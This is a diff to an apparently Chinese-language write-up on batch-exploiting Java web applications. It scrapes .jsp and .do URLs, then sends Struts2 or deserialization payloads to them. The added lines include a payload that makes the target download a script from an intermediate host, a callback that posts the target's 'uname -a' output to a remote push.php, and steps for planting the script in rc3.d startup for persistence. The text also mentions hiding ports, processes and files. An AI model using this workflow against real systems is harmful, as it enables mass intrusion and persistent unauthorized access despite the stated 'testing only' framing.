@@ -18,8 +18,11 @@ URL=`cat 1.log | grep -Eo "<a[^>]+?href=[\"']?([^\"']+)[\"']?[^>]*>([^<]+)</a>"`
 #过滤do或者jsp或者action的query请求。
 JSP=`echo $URL | grep -Eo "http[s]?://([A-Za-z0-9\.]*)?/[0-9a-zA-Z0-9/]+([^\.jsp]+)\.jsp"`
 DO=`echo $P | grep -Eo "http[s]?://([A-Za-z0-9\.]*)?/[0-9a-zA-Z0-9/]+\.do([\?]?[^\"']+)?"`
+
+ANYLIST=()
+LIST=$JSP$DO
 foreach(){
-	for url in $JSP$DO;do
+	for url in $LIST;do
 		#执行目标
 	done
 	echo 
@@ -31,26 +34,35 @@ foreach(){
 
 ### 0x02 目的
 满足需求后执行我们的目的，也就是漏洞利用，但是在利用之前，要确定，如果成功，需要做什么事情，
-那么，一般黑帽做到这步的情况，就是提权留后门，由于我们只做测试检测，所以，在这里，就只邀请服务器向
+那么，一般黑帽做到这步的情况，就是提权留后门，由于我们只做测试检测，所以，在这里，就只要求服务器向
 我们的中间服务器发送一个带kernel参数的POST，来确定目标系统的版本。
 ```shell
 #!/bin/sh
 #执行目标
-exp();
-#exp的实现，根据java的各种漏洞，不如java反序列化，struts2等漏洞（如果是此类型漏洞可能还需要进一步
+exp $url
+#exp的实现，根据java的各种漏洞，如java反序列化，struts2等漏洞（如果是此类型漏洞可能还需要进一步
 #确定，如果无法确认，放入任意漏洞检测队列）。
-#大致实现是
+#构造请求包，执行系统调用，大致实现是
 while read line
 do 
     data="$data${line}"
 done < data.dat
 exp(){
-	#构造一个请求包，向服务器发送请求。
+	#构造一个请求包，向服务器发送请求。目标服务器下载中间服务器脚本程序执行。
+	#data的数据类似data=curl -k -L http://www.example.com/curl-exp.sh -o curl-exp.sh
 	curl -k -L $1 -F "data=$data"
 }
 #实现一个隐藏端口，隐藏进程，隐藏文件的`linux mod`,
+#由于这里做检测，所以只实现一个http请求。
+#daemon-exp.sh
+daemon_exp(){
+	KK=`uname -a`
+	curl -k -L -F "kernel="$KK http://www.example.com/push.php 
+}
 #编写`shell init`放到启动项里根据不同情况触发，如：`/etc/init/[rc0.d,rc1.d,rc2.d,rc3.d,rc4.d]`
-#编写提权运行程序
+#把daemon-exp.sh放入rc3.d开机启动里面；
+
+#运行程序
 #curl_exp.sh
 
 CURL=`which curl`
@@ -74,7 +86,7 @@ exit 0;
 
 ### 0x03 结果
 验证中间服务器收到的请求，确定目标机存在漏洞。
-
+查看已经成功运行我们的exp脚本服务器。
 
 PS：
 ①需求，这里指满足条件。
